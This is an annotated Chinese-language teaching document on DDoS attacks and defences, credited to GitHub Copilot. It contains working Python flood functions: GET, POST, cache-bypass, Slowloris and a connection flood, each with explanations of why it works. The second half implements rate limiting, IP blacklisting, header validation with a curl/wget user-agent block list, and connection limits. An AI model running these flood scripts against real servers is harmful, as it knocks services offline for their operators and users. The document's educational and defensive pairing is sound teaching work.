# 🎓 DDoS 攻擊與防禦代碼註解版

## 本文件包含詳細註解的核心代碼片段

---

## 📦 攻擊技術實現 (帶詳細註解)

### 1. HTTP GET Flood - 最基礎的洪水攻擊

```python
def http_get_flood(self):
    """
    HTTP GET 洪水攻擊實現
    
    【攻擊原理】
    1. 模擬正常瀏覽器的 GET 請求
    2. 通過高頻率請求消耗伺服器資源
    3. 每個請求都會觸發伺服器的完整處理流程
    
    【資源消耗】
    - CPU: 處理 HTTP 解析、路由匹配、業務邏輯
    - 記憶體: 每個請求佔用一個連接對象
    - 網路: 佔用帶寬接收請求和發送響應
    - I/O: 讀取文件、數據庫查詢
    
    【為什麼有效】
    - 伺服器處理每個請求需要時間 (10-100ms)
    - 攻擊者發送請求幾乎不消耗時間 (<1ms)
    - 1000 個請求可佔用伺服器 10-100 秒
    - 並發攻擊可迅速耗盡伺服器連接池
    
    【典型場景】
    攻擊者: 100 台電腦,每台 100 線程 = 10,000 並發
    伺服器: 最大 1,000 連接
    結果: 伺服器瞬間被佔滿,正常用戶無法連接
    """
    while self.running:  # 持續攻擊直到停止
        try:
            # 發送 GET 請求到目標 URL
            response = requests.get(
                self.target_url,  # 目標地址
                timeout=2         # 2秒超時,避免長時間等待
            )
            # 成功發送,計數器 +1
            self.increment_stats(True)
        except:
            # 連接失敗(伺服器過載、網路問題)
            # 忽略錯誤繼續攻擊
            self.increment_stats(False)
```

---

### 2. HTTP POST Flood - 更消耗資源的攻擊

```python
def http_post_flood(self):
    """
    HTTP POST 洪水攻擊實現
    
    【攻擊原理】
    1. POST 請求通常觸發寫入操作(數據庫、文件)
    2. 伺服器需要解析請求體(JSON/Form/Multipart)
    3. 可能觸發複雜業務邏輯(驗證、計算、通知)
    
    【為什麼比 GET 更強】
    - 數據庫寫入: 比讀取慢 10-100 倍
    - 解析請求體: 需要額外 CPU 時間
    - 業務邏輯: 創建訂單、發送郵件等耗時操作
    - 事務處理: 數據庫鎖、ACID 保證
    
    【實際案例】
    場景: 電商網站的「加入購物車」接口
    - GET 查看商品: 10ms (緩存命中)
    - POST 加入購物車: 100ms (數據庫寫入 + 庫存檢查)
    攻擊效果: POST 攻擊威力是 GET 的 10 倍
    
    【防禦重點】
    - POST 請求需要更嚴格的速率限制
    - 必須驗證 Content-Type
    - 限制請求體大小
    - 使用 CSRF Token 防止偽造
    """
    while self.running:
        try:
            # 構造 1000 字節的隨機數據
            # 目的: 消耗伺服器解析和處理時間
            data = {
                'data': ''.join(random.choices(
                    string.ascii_letters + string.digits,  # A-Za-z0-9
                    k=1000  # 1000 個字符
                ))
            }
            
            # 發送 POST 請求
            response = requests.post(
                self.target_url,
                data=data,      # 請求體數據
                timeout=2       # 超時設置
            )
            self.increment_stats(True)
        except:
            self.increment_stats(False)
```

---

### 3. Cache Bypass Attack - 繞過 CDN 防護

```python
def http_cache_bypass(self):
    """
    緩存繞過攻擊實現
    
    【攻擊原理】
    1. CDN 和反向代理使用 URL 作為緩存鍵
    2. URL 完全相同 → 返回緩存,不打到源站
    3. URL 有任何差異 → 緩存失效,請求源站
    4. 添加隨機參數讓每個 URL 唯一
    
    【為什麼能繞過 CDN】
    CDN 緩存邏輯:
    ```
    cache_key = hash(url + query_params)
    if cache_key in cache:
        return cache[cache_key]  # 命中緩存,不訪問源站
    else:
        response = request_origin_server()  # 請求源站
        cache[cache_key] = response
        return response
    ```
    
    攻擊時:
    ```
    /page?rand=1  → cache miss → 源站
    /page?rand=2  → cache miss → 源站
    /page?rand=3  → cache miss → 源站
    每個請求都繞過緩存!
    ```
    
    【實際效果】
    無攻擊:
    - 1000 個請求 → 1 次源站訪問 + 999 次緩存命中
    - 源站 QPS: 1
    
    有攻擊:
    - 1000 個請求 → 1000 次源站訪問
    - 源站 QPS: 1000 (增加 1000 倍!)
    
    【防禦方法】
    1. 檢測 URL 模式: 如果大量請求只有查詢參數不同
    2. 忽略特定參數: 配置 CDN 忽略 rand、cache、_ 等參數
    3. 標準化 URL: 排序參數,移除無意義參數
    4. 速率限制: 基於 IP 而非 URL
    """
    while self.running:
        try:
            # 生成隨機參數繞過緩存
            params = {
                'rand': random.randint(1, 999999),  # 隨機數
                'cache': time.time()                # 時間戳
            }
            # 完整 URL 示例:
            # http://example.com/page?rand=123456&cache=1700000000.123
            
            response = requests.get(
                self.target_url,
                params=params,  # 自動編碼為查詢字符串
                timeout=2
            )
            self.increment_stats(True)
        except:
            self.increment_stats(False)
```

---

### 4. Slowloris Attack - 慢速耗盡連接池

```python
def http_slowloris(self):
    """
    Slowloris 慢速攻擊實現
    
    【攻擊原理】
    1. 建立 TCP 連接到伺服器
    2. 發送不完整的 HTTP 請求
    3. 定期發送額外標頭保持連接活躍
    4. 永不發送最終標誌(空行 \\r\\n\\r\\n)
    5. 伺服器一直等待請求完成,佔住連接
    
    【HTTP 協議基礎】
    完整的 HTTP 請求格式:
    ```
    GET /path HTTP/1.1\\r\\n
    Host: example.com\\r\\n
    User-Agent: Mozilla/5.0\\r\\n
    Connection: keep-alive\\r\\n
    \\r\\n  ← 空行表示標頭結束,開始等待請求體
    ```
    
    Slowloris 發送:
    ```
    GET /path HTTP/1.1\\r\\n
    Host: example.com\\r\\n
    (等待 15 秒)
    User-Agent: Mozilla/5.0\\r\\n
    (等待 15 秒)
    X-Custom-1: value\\r\\n
    (永遠不發送最後的 \\r\\n)
    ```
    
    伺服器狀態:
    - 連接已建立,佔用一個連接槽
    - 等待 HTTP 請求完整接收
    - 超時時間通常 300 秒(5 分鐘)
    - 5 分鐘內這個連接不能服務其他用戶
    
    【為什麼威力巨大】
    攻擊成本:
    - 1 台電腦可維持 200+ 個慢速連接
    - 流量極小: 每 15 秒僅 30 字節
    - 難以檢測: 看起來像慢速網路用戶
    
    伺服器損失:
    - Apache MaxClients=256 → 被佔 200 個
    - 剩餘 56 個連接給全部正常用戶
    - 網站基本無法訪問
    
    【實際案例】
    2009年,Slowloris 成功攻擊了許多 Apache 伺服器
    單台電腦癱瘓了數百個網站
    
    【防禦方法】
    1. 降低請求超時: 300s → 10s
    2. 設置最小傳輸速率: 必須 >1KB/s
    3. 限制每 IP 連接數: 最多 10 個
    4. 使用異步伺服器: Nginx, Node.js (不怕慢連接)
    """
    try:
        # 步驟 1: 建立 TCP 連接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((self.target_host, self.target_port))
        
        # 步驟 2: 發送不完整的 HTTP 請求行
        # 注意: 僅發送請求行,沒有空行結束標誌
        request_line = "GET /?{} HTTP/1.1\\r\\n".format(
            random.randint(0, 2000)  # 隨機路徑避免被識別
        )
        sock.send(request_line.encode("utf-8"))
        
        # 步驟 3: 發送 User-Agent 標頭
        # 偽裝成正常瀏覽器
        user_agent = "User-Agent: {}\\r\\n".format(
            random.choice([
                "Mozilla/5.0",  # 常見瀏覽器標識
                "Chrome/91.0",
                "Safari/14.0"
            ])
        )
        sock.send(user_agent.encode("utf-8"))
        
        # 步驟 4: 持續發送額外標頭保持連接
        while self.running:
            try:
                # 每 15 秒發送一個無意義的自定義標頭
                # 目的: 讓伺服器知道連接還活著,繼續等待
                keep_alive_header = "X-a: {}\\r\\n".format(
                    random.randint(1, 5000)
                )
                sock.send(keep_alive_header.encode("utf-8"))
                
                self.increment_stats(True)
                
                # 關鍵: 慢速發送
                # 如果太快伺服器可能超時,太慢則無意義
                time.sleep(15)  # 15 秒間隔是經驗值
            except:
                # 連接斷開(伺服器超時或主動關閉)
                break
    except:
        # 連接建立失敗
        self.increment_stats(False)
```

---

### 5. TCP SYN Flood - 網路層攻擊

```python
def tcp_syn_flood(self):
    """
    TCP SYN 洪水攻擊實現(簡化版)
    
    【TCP 三次握手回顧】
    正常建立連接:
    ```
    客戶端                     伺服器
       |                         |
       |----SYN(seq=x)---------->|  1. 客戶端發送 SYN
       |                         |  2. 伺服器分配資源,進入 SYN_RECV 狀態
       |<---SYN-ACK(seq=y)-------|  3. 伺服器回復 SYN-ACK
       |                         |
       |----ACK(seq=x+1)-------->|  4. 客戶端確認,連接建立
       |                         |  5. 狀態變為 ESTABLISHED
    ```
    
    【SYN Flood 攻擊】
    攻擊流程:
    ```
    攻擊者                     伺服器
       |                         |
       |----SYN(seq=x)---------->|  1. 發送 SYN
       |                         |  2. 伺服器分配資源(半開連接)
       |<---SYN-ACK(seq=y)-------|  3. 伺服器回復
       |                         |
       |   (不發送 ACK!)          |  4. 攻擊者不回應
       |                         |  5. 伺服器持續等待 ACK
       |                         |  6. 直到超時(默認 60 秒)
       |                         |
       |----SYN(seq=z)---------->|  重複發送新的 SYN
       |                         |  繼續佔用資源
    ```
    
    【為什麼致命】
    伺服器資源消耗:
    - 每個半開連接佔用記憶體(TCB 結構體)
    - 半開連接隊列有限(默認 128-1024)
    - 隊列滿後,所有新連接被拒絕
    - 正常用戶完全無法連接
    
    攻擊者優勢:
    - 發送 SYN 包極快(微秒級)
    - 不需要等待響應
    - 可偽造源 IP 地址(難以追蹤)
    - 單機可發送數萬 PPS
    
    【實際數據】
    攻擊前:
    - netstat -an | grep SYN_RECV | wc -l
    - 結果: 0-10 個半開連接
    
    攻擊中:
    - 結果: 1000+ 個半開連接
    - 新連接: Connection refused
    
    【防禦方法】
    1. SYN Cookie (Linux 內核)
       - 不分配資源,將狀態編碼在 Sequence Number
       - 收到 ACK 時驗證並建立連接
       - 無隊列限制,但性能略降
    
    2. 增加半開連接隊列
       ```
       sysctl -w net.ipv4.tcp_max_syn_backlog=4096
       ```
    
    3. 降低 SYN-ACK 重傳次數
       ```
       sysctl -w net.ipv4.tcp_synack_retries=1
       ```
    
    4. 硬體防火牆
       - 檢測 SYN 包速率異常
       - 自動啟用 SYN Cookie
       - 流量清洗中心
    
    【注意】
    本實現是簡化版,真實 SYN Flood 需要:
    - 原始套接字(Raw Socket)權限
    - 構造原始 IP/TCP 包
    - 偽造源 IP 地址
    - scapy、hping3 等工具
    """
    while self.running:
        try:
            # 創建 TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # 發起連接(發送 SYN)
            # 實際會完成三次握手,與真實 SYN Flood 不同
            sock.connect((self.target_host, self.target_port))
            
            # 立即關閉,模擬不完整握手
            sock.close()
            
            self.increment_stats(True)
        except:
            # 連接失敗(伺服器過載)
            self.increment_stats(False)
```

---

## 🛡️ 防禦機制實現 (帶詳細註解)

### 1. Rate Limiting - 速率限制

```python
def check_rate_limit(self, ip, max_requests=20, time_window=10):
    """
    速率限制檢查實現
    
    【演算法: 滑動窗口】
    時間軸:
    ```
    |--10s window--|
    現在時間
    ^
    只統計這個窗口內的請求
    ```
    
    數據結構:
    ```python
    ip_requests = {
        '192.168.1.100': deque([
            1700000000.1,  # 10.5 秒前
            1700000005.2,  # 5.5 秒前
            1700000008.3,  # 2.5 秒前
            1700000010.6,  # 0.6 秒前  ← 現在是 1700000010.7
        ])
    }
    ```
    
    檢查步驟:
    1. 獲取當前時間: now = 1700000010.7
    2. 計算窗口起點: start = now - 10 = 1700000000.7
    3. 移除窗口外請求: 1700000000.1 < 1700000000.7,刪除
    4. 統計窗口內請求: 3 個
    5. 判斷: 3 < 20,允許通過
    6. 記錄本次請求: append(1700000010.7)
    
    【為什麼有效】
    假設攻擊者發送 100 req/s:
    - 前 20 個請求通過(0-0.2s)
    - 第 21 個請求被攔截
    - 直到 10 秒後才能再次發送 20 個
    - 實際通過: 20 req/10s = 2 req/s
    - 攔截率: 98%!
    
    【配置建議】
    不同場景的速率限制:
    ```python
    limits = {
        '靜態資源': (100, 10),  # 100 req/10s,寬鬆
        '動態頁面': (20, 10),   # 20 req/10s,中等
        'API 接口': (10, 60),   # 10 req/60s,嚴格
        'POST 請求': (5, 60),   # 5 req/60s,最嚴
    }
    ```
    
    【優缺點】
    優點:
    + 實現簡單,CPU 開銷小
    + 對爆發流量有效
    + 可動態調整參數
    
    缺點:
    - 可能誤傷正常用戶(多標籤頁)
    - 分佈式攻擊難以防禦(每個 IP 發送少量請求)
    - NAT 環境誤傷整個辦公室
    
    【進階技巧】
    令牌桶算法(Token Bucket):
    ```python
    # 允許短時突發,但長期限制平均速率
    bucket_size = 20      # 桶容量
    refill_rate = 2       # 每秒補充 2 個令牌
    
    # 每個請求消耗 1 個令牌
    # 突發: 可立即發送 20 個請求
    # 持續: 最多 2 req/s
    ```
    """
    # 如果速率限制功能關閉,直接通過
    if not defense_config['rate_limiting']:
        return True
    
    # 使用線程鎖確保線程安全
    # 多個請求可能同時訪問同一 IP 的記錄
    with self.lock:
        # 獲取當前時間
        now = time.time()
        
        # 記錄本次請求時間
        # deque 自動維護最多 100 個記錄
        self.ip_requests[ip].append(now)
        
        # 清理窗口外的舊記錄
        # 只保留最近 time_window 秒內的請求
        while (self.ip_requests[ip] and 
               self.ip_requests[ip][0] < now - time_window):
            self.ip_requests[ip].popleft()  # 從左側移除
        
        # 統計窗口內的請求數
        request_count = len(self.ip_requests[ip])
        
        # 檢查是否超過限制
        if request_count > max_requests:
            # 超過限制,加入黑名單 30 秒
            self.ip_blocked[ip] = now + 30
            
            # 記錄日誌
            self.log_block(ip, "速率限制", 
                          f"{request_count}/{max_requests} in {time_window}s")
            
            return False  # 拒絕請求
        
        return True  # 允許請求
```

---

### 2. IP Blacklist - IP 黑名單

```python
def is_ip_blocked(self, ip):
    """
    IP 黑名單檢查實現
    
    【數據結構】
    ```python
    ip_blocked = {
        '192.168.1.100': 1700000100.5,  # 解封時間戳
        '192.168.1.101': 1700000200.3,
        '192.168.1.102': 1700000300.8,
    }
    ```
    
    【工作流程】
    1. 用戶請求到達
    2. 提取客戶端 IP
    3. 查詢黑名單字典
    4. 如果存在且未到期 → 拒絕
    5. 如果到期 → 自動移除,允許通過
    
    【觸發條件】
    IP 會因以下原因被加入黑名單:
    1. 速率限制超標 → 封鎖 30 秒
    2. 請求驗證失敗 → 封鎖 60 秒
    3. 惡意特徵匹配 → 封鎖 300 秒
    4. 累積違規分數 > 閾值 → 封鎖 1-24 小時
    
    【累積違規分數系統】
    ```python
    violation_scores = {
        '速率超標': 10,
        '無效User-Agent': 20,
        '可疑路徑訪問': 15,
        'SQL注入嘗試': 50,
        '掃描漏洞': 30,
    }
    
    # 分數累積
    ip_score['192.168.1.100'] = 0
    ip_score['192.168.1.100'] += 10  # 速率超標
    ip_score['192.168.1.100'] += 20  # 無效UA
    # 總分 30 → 封鎖 5 分鐘
    
    ip_score['192.168.1.100'] += 50  # SQL注入
    # 總分 80 → 封鎖 1 小時
    ```
    
    【封鎖策略】
    階梯式懲罰:
    ```
    第 1 次違規: 警告(不封鎖)
    第 2 次違規: 30 秒
    第 3 次違規: 5 分鐘
    第 4 次違規: 1 小時
    第 5 次違規: 24 小時
    ```
    
    【誤封處理】
    問題: 正常用戶可能被誤封
    
    解決方案:
    1. 提供解封接口:
       ```
       GET /admin/unblock?ip=192.168.1.100&token=secret
       ```
    
    2. 白名單機制:
       ```python
       whitelist = [
           '192.168.0.0/16',    # 內網 IP
           '114.114.114.114',   # 信任的 IP
       ]
       ```
    
    3. 用戶申訴系統:
       - 填寫表單說明情況
       - 管理員審核
       - 自動或手動解封
    
    【NAT 環境問題】
    場景: 整個公司使用同一個出口 IP
    ```
    公司內網:
    - 員工A: 192.168.1.10 → NAT → 203.0.113.1
    - 員工B: 192.168.1.20 → NAT → 203.0.113.1
    - 員工C: 192.168.1.30 → NAT → 203.0.113.1
    ```
    
    問題:
    - 員工 C 被封 → 整個公司都無法訪問
    
    解決:
    1. 檢測 NAT IP(大量不同 User-Agent)
    2. NAT IP 使用更寬鬆的限制
    3. 結合 Cookie/Session 識別個體用戶
    4. 使用 Captcha 而非直接封鎖
    """
    # 如果黑名單功能關閉,直接通過
    if not defense_config['ip_blacklist']:
        return False
    
    with self.lock:
        # 檢查 IP 是否在黑名單中
        if ip in self.ip_blocked:
            # 獲取解封時間
            unblock_time = self.ip_blocked[ip]
            
            # 檢查是否還在封鎖期內
            if time.time() < unblock_time:
                # 仍在封鎖期,拒絕請求
                remaining = int(unblock_time - time.time())
                print(f"[BLOCKED] IP {ip} 還需等待 {remaining} 秒")
                return True  # True 表示被封鎖
            else:
                # 封鎖期已過,自動解封
                del self.ip_blocked[ip]
                print(f"[UNBLOCKED] IP {ip} 自動解封")
        
        return False  # False 表示未被封鎖
```

---

### 3. Request Validation - 請求驗證

```python
def validate_request(self, headers):
    """
    HTTP 請求驗證實現
    
    【驗證項目】
    1. User-Agent 存在性
    2. User-Agent 格式合法性
    3. 瀏覽器標頭一致性
    4. 必要標頭完整性
    5. 標頭值合理性
    
    【User-Agent 分析】
    正常瀏覽器:
    ```
    Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
    AppleWebKit/537.36 (KHTML, like Gecko) 
    Chrome/91.0.4472.124 Safari/537.36
    ```
    
    腳本攻擊:
    ```
    python-requests/2.28.1  ← 明顯是腳本
    curl/7.68.0             ← 命令行工具
    (空)                    ← 缺少 UA
    Bot/1.0                 ← 爬蟲
    ```
    
    【瀏覽器指紋】
    Chrome 瀏覽器的標準標頭組合:
    ```
    User-Agent: Chrome/xxx
    Sec-Ch-Ua: "Chrome";v="91"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept: text/html,application/xhtml+xml...
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Accept-Encoding: gzip, deflate, br
    ```
    
    矛盾的標頭組合(腳本偽造):
    ```
    User-Agent: Chrome/xxx      ← 聲稱是 Chrome
    Sec-Ch-Ua: (缺少)          ← 但缺少 Chrome 特有標頭
    → 識別為腳本攻擊
    ```
    
    【TLS 指紋】
    高級防禦可檢測 TLS 握手特徵:
    ```
    真實 Chrome:
    - TLS 1.3
    - 特定的 Cipher Suite 順序
    - 特定的擴展組合
    
    Python requests:
    - TLS 1.2
    - 不同的 Cipher Suite
    - 缺少某些擴展
    → 即使 User-Agent 偽造,仍可識別
    ```
    
    【驗證策略】
    分級驗證:
    ```python
    # 第 1 級: 基礎檢查(本實現)
    - User-Agent 存在
    - 不在黑名單中
    
    # 第 2 級: 標頭一致性
    - 瀏覽器標頭組合匹配
    - Accept 標頭合理
    
    # 第 3 級: 行為檢測
    - 訪問路徑符合邏輯
    - 請求間隔符合人類行為
    
    # 第 4 級: JavaScript 挑戰
    - 執行 JS 計算(腳本無法執行)
    - Cookie 檢測
    - Canvas 指紋
    ```
    
    【誤判處理】
    假陽性(誤報):
    - 某些合法爬蟲(Googlebot)
    - 舊版瀏覽器
    - 隱私保護擴展修改 UA
    
    解決:
    ```python
    whitelist_user_agents = [
        'Googlebot',      # 搜索引擎爬蟲
        'Bingbot',
        'monitoring-tool', # 監控服務
    ]
    ```
    """
    # 如果請求驗證功能關閉,直接通過
    if not defense_config['request_validation']:
        return True
    
    # 檢查 1: User-Agent 必須存在
    user_agent = headers.get('User-Agent', '')
    if not user_agent:
        self.log_block(ip, "缺少User-Agent", "請求缺少必要標頭")
        return False
    
    # 檢查 2: User-Agent 長度合理
    # 正常 UA 長度: 80-200 字符
    # 過短: 可能是腳本
    # 過長: 可能是攻擊(緩衝區溢出嘗試)
    if len(user_agent) < 5:
        self.log_block(ip, "User-Agent過短", f"長度: {len(user_agent)}")
        return False
    
    if len(user_agent) > 500:
        self.log_block(ip, "User-Agent過長", f"長度: {len(user_agent)}")
        return False
    
    # 檢查 3: User-Agent 黑名單
    bot_signatures = [
        'python-requests',  # Python requests 庫
        'curl/',           # curl 命令
        'wget/',           # wget 命令
        'bot',             # 通用機器人
        'spider',          # 爬蟲
        'scraper',         # 抓取器
        'scanner',         # 掃描器
    ]
    
    user_agent_lower = user_agent.lower()
    for signature in bot_signatures:
        if signature in user_agent_lower:
            self.log_block(ip, "可疑User-Agent", 
                          f"匹配特徵: {signature}")
            return False
    
    return True  # 通過所有檢查
```

---

### 4. Connection Limit - 連接數限制

```python
def check_connection_limit(self, ip, max_connections=10):
    """
    連接數限制檢查實現
    
    【為什麼需要】
    場景 1: Slowloris 攻擊
    - 單個 IP 建立 200 個慢速連接
    - 佔用伺服器連接池
    - 正常用戶無法連接
    
    場景 2: 資源耗盡
    - 每個連接佔用記憶體(TCB, Socket Buffer)
    - 過多連接導致 OOM(Out of Memory)
    
    場景 3: 異常流量
    - 正常用戶很少超過 10 個並發連接
    - 超過 10 個可能是:
      * 惡意攻擊
      * 爬蟲程序
      * 錯誤的客戶端實現
    
    【連接生命週期管理】
    ```python
    # HTTP 請求處理流程
    def handle_request(self, ip):
        # 1. 連接建立
        defense.increment_connection(ip)  # 計數 +1
        
        try:
            # 2. 處理請求
            process_request()
        finally:
            # 3. 連接關閉(無論成功或失敗)
            defense.decrement_connection(ip)  # 計數 -1
    ```
    
    【並發連接數據】
    正常用戶:
    ```
    場景               並發連接數
    單頁面訪問         1-5 個 (HTML + CSS + JS + 圖片)
    多標籤頁           5-10 個
    視頻播放           2-3 個
    文件下載           1 個
    ```
    
    異常用戶:
    ```
    場景               並發連接數
    爬蟲              50-100 個
    DDoS 攻擊         100-1000 個
    Slowloris         200+ 個
    ```
    
    【配置策略】
    不同用戶類型:
    ```python
    connection_limits = {
        '未登錄用戶': 10,      # 嚴格限制
        '已登錄用戶': 20,      # 適度放寬
        'VIP 用戶': 50,       # 更寬鬆
        'API 客戶端': 100,    # 需要高並發
        '內部服務': 999999,   # 不限制
    }
    ```
    
    【與 Keep-Alive 的關係】
    HTTP Keep-Alive:
    ```
    Connection: keep-alive
    Keep-Alive: timeout=60, max=100
    
    含義: 
    - 連接可複用 60 秒
    - 最多發送 100 個請求
    ```
    
    問題:
    - Keep-Alive 讓連接長時間保持
    - 可能觸發連接數限制
    
    解決:
    ```python
    # 方案 1: 對 Keep-Alive 連接單獨計數
    active_connections[ip]      # 正在處理請求的連接
    idle_connections[ip]        # 閒置的 Keep-Alive 連接
    
    limit = 10
    check = active_connections[ip] < limit
    
    # 方案 2: 縮短 Keep-Alive 超時
    Keep-Alive: timeout=5  # 5秒後自動關閉
    ```
    
    【監控指標】
    重要指標:
    ```python
    # 1. 各 IP 連接數分佈
    connection_distribution = {
        '1-5 connections': 95%,   # 正常
        '6-10 connections': 4%,   # 正常
        '11-20 connections': 0.9%, # 可疑
        '>20 connections': 0.1%,  # 異常!
    }
    
    # 2. 連接持續時間
    connection_duration = {
        '<1s': 80%,    # 正常快速請求
        '1-10s': 15%,  # 正常慢請求
        '>10s': 5%,    # 可疑(Slowloris?)
    }
    
    # 3. 連接閒置時間
    idle_time = {
        '<5s': 90%,    # 正常
        '>60s': 10%,   # 異常,應主動關閉
    }
    ```
    """
    # 如果連接限制功能關閉,直接通過
    if not defense_config['connection_limit']:
        return True
    
    with self.lock:
        # 獲取當前 IP 的連接數
        current_connections = self.connection_count[ip]
        
        # 檢查是否超過限制
        if current_connections >= max_connections:
            self.log_block(ip, "連接數限制", 
                          f"{current_connections}/{max_connections}")
            return False  # 拒絕新連接
        
        return True  # 允許連接
```

---

## 📊 性能優化技巧

### 使用字典而非列表查找

```python
# ❌ 效率低: O(n) 時間複雜度
blacklist = ['192.168.1.1', '192.168.1.2', ...]  # 列表
if ip in blacklist:  # 需要遍歷整個列表
    block()

# ✅ 效率高: O(1) 時間複雜度
blacklist = {'192.168.1.1': True, '192.168.1.2': True, ...}  # 字典
if ip in blacklist:  # 哈希查找,幾乎即時
    block()
```

### 使用 deque 而非 list

```python
# ❌ 列表刪除頭部元素: O(n)
requests = [t1, t2, t3, ...]
requests.pop(0)  # 需要移動所有元素

# ✅ deque 刪除頭部: O(1)
from collections import deque
requests = deque([t1, t2, t3, ...])
requests.popleft()  # 即時操作
```

### 批量處理減少鎖競爭

```python
# ❌ 每次請求都加鎖
def handle_request():
    with lock:
        counter += 1  # 高並發時鎖競爭激烈

# ✅ 批量更新
thread_local_counter = 0  # 線程本地計數器

def handle_request():
    global thread_local_counter
    thread_local_counter += 1
    
    # 每 100 次才更新全局計數器
    if thread_local_counter % 100 == 0:
        with lock:
            global_counter += 100
```

---

**文檔版本**: v1.0  
**最後更新**: 2025-11-23  
**作者**: GitHub Copilot  
**用途**: 教育學習,代碼實現解析
